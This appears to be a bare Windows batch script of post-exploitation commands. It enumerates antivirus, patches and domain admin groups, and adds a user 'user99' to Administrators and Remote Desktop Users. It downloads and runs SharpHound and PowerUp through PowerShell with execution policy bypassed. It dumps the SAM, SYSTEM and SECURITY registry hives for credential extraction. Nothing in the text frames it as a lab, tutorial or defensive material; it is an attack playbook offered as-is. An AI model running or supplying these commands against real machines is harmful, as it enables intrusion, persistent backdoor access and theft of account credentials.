ECHO ============================
tasklist /svc
ECHO ============================
wmic /namespace:\\root\securitycenter2 path antivirusproduct
ECHO ============================
wmic qfe list brief
ECHO ===========================
ECHO ============================
net Accounts 
ECHO ============================
net localgroup administrators
ECHO ============================
net use
ECHO ============================
net share
ECHO ============================
net group "Enterprise Admins" /domain
ECHO ============================
net localgroup administrators /domain
ECHO ============================
net localgroup administrators user99 /add
ECHO ============================
net localgroup "Remote Desktop Users" user99 /add
ECHO ============================
net localgroup "Debugger users" user99 /add
ECHO ============================
net localgroup "Power users" user99 /add
ECHO ============================
net group “Domain Controllers” /domain
ECHO ============================
net group “Domain Admins” /domain
ECHO ============================
net user user99 /domain /active:no
ECHO ============================
net config workstation
ECHO ============================
net accounts
ECHO ============================
ECHO ============================
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
ECHO ============================
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks"
ECHO ============================
"powershell.exe" -nop -c "import-module applocker; get-command *applocker*
ECHO ============================
reg save HKLM\Security security.hive
ECHO ============================
reg save HKLM\System system.hive
ECHO ============================
reg save HKLM\SAM sam.hive
ECHO ============================
